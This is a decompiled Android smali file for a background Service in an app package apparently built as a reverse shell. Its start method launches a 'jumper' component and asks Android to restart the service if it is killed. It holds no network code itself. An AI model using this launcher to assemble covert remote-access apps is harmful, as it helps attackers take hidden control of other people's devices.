.class public Lcom/example/reverseshell2/mainService;
.super Landroid/app/Service;
.source "mainService.java"


# static fields
.field static TAG:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const-string v0, "mainServiceClass"

    sput-object v0, Lcom/example/reverseshell2/mainService;->TAG:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 2

    sget-object v0, Lcom/example/reverseshell2/mainService;->TAG:Ljava/lang/String;

    const-string v1, "in"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v0, Lcom/example/reverseshell2/jumper;

    invoke-virtual {p0}, Lcom/example/reverseshell2/mainService;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-direct {v0, v1}, Lcom/example/reverseshell2/jumper;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0}, Lcom/example/reverseshell2/jumper;->init()V

    const/4 v0, 0x1

    return v0
.end method
